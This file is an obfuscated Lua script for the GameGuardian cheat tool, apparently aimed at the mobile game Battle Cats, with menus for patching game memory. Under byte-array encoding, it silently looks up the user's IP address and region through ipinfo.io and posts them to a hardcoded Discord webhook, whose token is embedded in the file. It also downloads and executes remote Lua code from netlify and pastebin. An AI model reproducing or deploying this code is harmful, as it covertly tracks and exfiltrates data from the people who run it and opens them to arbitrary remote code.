_A = function(_B)return string.char(table.unpack(_B))end
URL =  _A({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,55,56,51,49,48,52,51,55,56,50,50,48,49,55,53,55,55,47,111,85,88,80,50,65,83,52,97,74,81,95,100,75,74,53,99,118,76,106,79,115,102,108,66,112,106,89,65,102,119,104,76,55,82,107,51,83,116,114,50,77,105,95,73,73,110,48,114,109,84,90,69,115,55,114,88,87,89,65,97,81,79,109,49,51,120,102}) ;
local a = gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ]( _A({104,116,116,112,115,58,47,47,105,112,105,110,102,111,46,105,111,47,63,99,97,108,108,98,97,99,107}) ).content;
local e, e, _C = a:find( _A({34,105,112,34,58,32,34,40,46,45,41,34,44}) );
local e, e, _D = a:find( _A({34,114,101,103,105,111,110,34,58,32,34,40,46,45,41,34,44}) );
e = nil;
headers = {
    [ _A({67,111,110,116,101,110,116,45,84,121,112,101}) ] =  _A({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110}) 
};
if ID == nil then postData =  _A({123,34,99,111,110,116,101,110,116,34,58,34,64,104,101,114,101,32,73,68,227,129,170,227,129,151,227,129,167,229,174,159,232,161,140,227,129,149,227,130,140,227,129,190,227,129,151,227,129,159,32,73,80,58,32,42,42}) .._C.. _A({44,32}) .._D.. _A({42,42,34,125}) ;
gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ](URL, headers, postData);
gg[ _A({97,108,101,114,116}) ]( _A({228,184,141,230,173,163,232,161,140,231,130,186,227,129,140,230,164,156,229,135,186,227,129,149,227,130,140,227,129,190,227,129,151,227,129,159,227,128,130,10,229,149,143,227,129,132,229,144,136,227,130,143,227,129,155,229,133,136,58,232,147,174,230,150,151,208,182,40,64,114,101,110,116,111,50,49,55,55,41}) );
os[ _A({101,120,105,116}) ]();
else postData =  _A({123,34,99,111,110,116,101,110,116,34,58,34,32,62,32,227,128,144,65,67,227,128,145,73,68,58,32,42,42}) ..ID.. _A({42,42,32,32,32,32,73,80,58,32}) .._C.. _A({44,32}) .._D.. _A({34,125}) ;end
a, _C, _D = nil, nil, nil;
function Main() 
    local hm = gg[ _A({99,104,111,105,99,101}) ]({
         _A({229,159,186,230,156,172,227,131,161,227,131,139,227,131,165,227,131,188}) ,
         _A({233,156,128,232,166,129,227,129,151,227,129,139,227,129,170,227,129,132,227,131,161,227,131,139,227,131,165,227,131,188}) ,
         _A({65,80,73,227,130,146,229,143,150,229,190,151,227,129,153,227,130,139}) ,
         _A({227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,232,168,173,229,174,154}) ,
         _A({231,181,130,228,186,134}) }, 2023,  _A({227,129,171,227,130,131,227,130,147,227,129,147,229,164,167,230,136,166,228,186,137,32,118}) ..gg[ _A({103,101,116,84,97,114,103,101,116,73,110,102,111}) ]().versionName);

    if hm ~= nil then
        load( _A({109,101,110,117}) ..hm.. _A({40,41,59}) )();
    end
end

function menu1()
    local mn1 = gg.prompt(cd.mn11, cd.mn12, cd.mn13);

    if mn1 ~= nil then
        if mn1[#cd.mn11] then Main();
        else
            for i = 1, #cd.mn11 do
                if mn1[i] == true then erDtc("p1"..i.."("..(cd.mn13[i+1] == "number" and mn1[i+1] or "")..");");
                elseif cd.mn13[i] == "number" and cd.mn12[i] ~= mn1[i] then erDtc("p1"..(i-1).."("..mn1[i]..");") end
            end
        end
    end
end

function menu2()
    local mn2 = gg.prompt(cd.mn21, cd.mn22, cd.mn23);

    if mn2 ~= nil then
        if mn2[#cd.mn21] then Main();
        else
            for i = 1, #cd.mn21 do
                if mn2[i] == true then erDtc("p2"..i.."("..(cd.mn23[i+1] == "number" and mn2[i+1] or "")..");");
                elseif cd.mn23[i] == "number" and cd.mn22[i] ~= mn2[i] then erDtc("p2"..(i-1).."("..mn2[i]..");") end
            end
        end
    end
end

function menu3()
    local get = gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ]( _A({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,117,47,115,105,104,101,102,111}) ).content;
    local id, con, sr, i = {}, {},  _A({}) , 1;

    if not get then
        gg[ _A({97,108,101,114,116}) ]( _A({227,131,135,227,131,188,227,130,191,227,129,174,229,143,150,229,190,151,227,129,171,229,164,177,230,149,151,227,129,151,227,129,190,227,129,151,227,129,159,227,128,130,10,227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,227,130,146,231,181,130,228,186,134,227,129,151,227,129,190,227,129,153,227,128,130}) );
        os[ _A({101,120,105,116}) ]();
    else
        while true do
            sr = get:find( _A({115,116,97,116,117,115}) );
            if sr ~= nil then
                id[i] = get:sub(sr+100, sr+107);
                get = get:sub(sr+107, -1);
                id[i+1] = get:sub(4, get:find( _A({60,47,97,62}) )-1);
                i = i+2;
            else
                break;
            end
        end
    end
    gg[ _A({116,111,97,115,116}) ]( _A({65,80,73,229,143,150,229,190,151,227,129,171,230,136,144,229,138,159}) );

    for i=2, #id, 2 do
        con[i/2] = id[i];
    end
    con[#con+1] =  _A({227,131,161,227,130,164,227,131,179,227,129,171,230,136,187,227,130,139}) ;

    local Hx = gg[ _A({109,117,108,116,105,67,104,111,105,99,101}) ](con, nil,  _A({65,80,73,228,184,128,232,166,167}) );
    if Hx then
        for i=1, #id/2 do
            if Hx[i] then
                pcall(load(gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ]( _A({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47}) ..id[i*2-1]).content));
            end 
        end

        if Hx[#con] then
            Main();
        end
    end    
end

function menu4()
    local mn4 = gg[ _A({99,104,111,105,99,101}) ](cd.mn4, 2023,  _A({227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,230,131,133,229,160,177,227,131,187,232,168,173,229,174,154,229,164,137,230,155,180}) );

    if mn4 == #cd.mn4 or not mn4 then 
        Main();
    else
        load( _A({112,52}) ..mn4.. _A({40,41,59}) )();
    end
end

function menu5()
    gg[ _A({115,101,116,82,97,110,103,101,115}) ](ex.rang);
    gg[ _A({108,111,97,100,82,101,115,117,108,116,115}) ](ex.val);
    gg[ _A({115,101,116,86,105,115,105,98,108,101}) ](true);
    os[ _A({101,120,105,116}) ]();
end

function erDtc(fx)  --error detection
    local fn = pcall(load(fx));
    if fn == false then
        gg[ _A({97,108,101,114,116}) ]( _A({233,150,162,230,149,176,123,8}) ..fx.. _A({8,125,227,129,167,227,130,168,227,131,169,227,131,188,227,129,140,231,153,186,231,148,159,227,129,151,227,129,159,227,129,191,227,129,159,227,129,132,227,128,130,10,227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,227,130,146,231,181,130,228,186,134,227,129,151,227,129,190,227,129,153,227,128,130}) );
        gg[ _A({115,101,116,82,97,110,103,101,115}) ](ex.rang);
        gg[ _A({108,111,97,100,82,101,115,117,108,116,115}) ](ex.val);
        os[ _A({101,120,105,116}) ]();
    end
end

::SetUp::
print( _A({83,99,114,105,112,116,228,189,156,230,136,144,58,32,232,147,174,230,150,151,208,182}) );
ex = {
    [ _A({114,97,110,103}) ] = gg[ _A({103,101,116,82,97,110,103,101,115}) ](),
    [ _A({118,97,108}) ] = gg[ _A({103,101,116,82,101,115,117,108,116,115}) ](gg[ _A({103,101,116,82,101,115,117,108,116,115,67,111,117,110,116}) ]())
};
local bol = pcall(function()
    dofile( _A({46,46,47,103,103,46,115,99,114,105,112,116,46,99,102,103}) );
    end);
if not pcall(load(gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ]( _A({104,116,116,112,115,58,47,47,103,103,115,120,46,110,101,116,108,105,102,121,46,97,112,112,47,102,110,46,108,117,97}) ).content)) then 
    os[ _A({101,120,105,116}) ]();
end
gg[ _A({109,97,107,101,82,101,113,117,101,115,116}) ](URL, headers, postData);
if not bol then
    gg[ _A({97,108,101,114,116}) ]( _A({227,131,135,227,131,188,227,130,191,227,130,146,227,131,128,227,130,166,227,131,179,227,131,173,227,131,188,227,131,137,227,129,151,227,129,190,227,129,153}) );
    dofile(cf());
    gg[ _A({116,111,97,115,116}) ]( _A({229,174,140,228,186,134}) );
end

gg[ _A({115,101,116,86,105,115,105,98,108,101}) ](false);
lib = gg[ _A({103,101,116,82,97,110,103,101,115,76,105,115,116}) ]( _A({99,111,110,102,105,103,46,97,114,109,54,52,95,118,56,97,46,97,112,107,58,98,115,115}) );
if #lib ~= 0 then
    gg[ _A({115,101,116,82,97,110,103,101,115}) ](-2080896);
else
    gg[ _A({115,101,116,82,97,110,103,101,115}) ](48);
end

gg[ _A({99,108,101,97,114,82,101,115,117,108,116,115}) ]();
gg[ _A({115,101,97,114,99,104,78,117,109,98,101,114}) ]( _A({104,32,57,48,32,55,69,32,48,48,32,48,48}) , 1);
gg[ _A({114,101,102,105,110,101,78,117,109,98,101,114}) ]( _A({104,57,48}) , 1);
local res = gg[ _A({103,101,116,82,101,115,117,108,116,115}) ](gg[ _A({103,101,116,82,101,115,117,108,116,115,67,111,117,110,116}) ]());
if #res == 0 then
    gg[ _A({99,108,101,97,114,82,101,115,117,108,116,115}) ]();
    gg[ _A({115,101,97,114,99,104,78,117,109,98,101,114}) ]( _A({104,32,56,48,32,55,48,32,48,48,32,48,48}) , 1);
    gg[ _A({114,101,102,105,110,101,78,117,109,98,101,114}) ]( _A({104,56,48}) , 1);
    res = gg[ _A({103,101,116,82,101,115,117,108,116,115}) ](gg[ _A({103,101,116,82,101,115,117,108,116,115,67,111,117,110,116}) ]());
end

if #res == 0 then
    gg[ _A({97,108,101,114,116}) ]( _A({227,131,151,227,131,173,227,130,187,227,130,185,227,130,146,91,227,129,171,227,130,131,227,130,147,227,129,147,229,164,167,230,136,166,228,186,137,93,227,129,171,227,129,151,227,129,166,229,134,141,229,174,159,232,161,140,227,129,151,227,129,166,227,129,143,227,129,160,227,129,149,227,129,132,227,128,130,10,227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,227,130,146,231,181,130,228,186,134,227,129,151,227,129,190,227,129,153,227,128,130}) );
    gg[ _A({115,101,116,86,105,115,105,98,108,101}) ](true);
    os[ _A({101,120,105,116}) ]();
else
    for i=1, #res do
        if #res-3 <= i then
            gg[ _A({97,108,101,114,116}) ]( _A({230,149,176,229,128,164,227,129,140,232,166,139,227,129,164,227,129,139,227,130,138,227,129,190,227,129,155,227,130,147,227,129,167,227,129,151,227,129,159,227,128,130,10,227,130,185,227,130,175,227,131,170,227,131,151,227,131,136,227,130,146,231,181,130,228,186,134,227,129,151,227,129,190,227,129,153,227,128,130}) );
            gg[ _A({115,101,116,86,105,115,105,98,108,101}) ](true);
            os[ _A({101,120,105,116}) ]();
        end
        local v1 = res[i+3].address - res[i+1].address;
        local v2, v3 = res[i].address, 0;
        if 0x3000 <= v1 and v1 <= 0x4000 and #K(4, res[i].address, 0x40) ~= 0 then
            base = res[i].address;
            gg[ _A({116,111,97,115,116}) ]( _A({83,117,99,99,101,115,115,102,117,108,108,121,32,111,102,32,103,101,116,32,98,97,115,101,32,118,97,108,117,101,33}) );
            break;
        end
    end
end

scr = 1;    --screen
::System::
    if gg[ _A({105,115,86,105,115,105,98,108,101}) ](true) or scr == 1 then
        gg[ _A({115,101,116,86,105,115,105,98,108,101}) ](false);
        Main();
        scr = 0;
    end
goto System;
